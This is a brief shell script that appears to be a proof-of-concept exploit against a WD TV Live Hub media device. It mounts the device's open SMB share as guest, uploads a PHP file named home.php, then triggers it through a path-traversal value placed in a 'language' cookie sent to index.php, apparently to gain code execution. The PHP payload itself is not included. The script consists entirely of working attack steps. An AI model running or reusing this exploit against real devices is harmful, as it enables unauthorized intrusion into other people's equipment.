#!/bin/sh
TARGET="hub"
SHARE="WDTVLiveHub"
MOUNTPOINT="/tmp/mp"

echo " Uploading payload:"
mkdir -p ${MOUNTPOINT}
mount -t cifs -o user=guest,password="" //${TARGET}/${SHARE} ${MOUNTPOINT}
cp home.php ${MOUNTPOINT}
umount ${MOUNTPOINT}

echo " Running payload:"
curl --cookie "language=../../../../mediaitems/Local/WDTVLiveHub/" \
 http://${TARGET}/index.php 
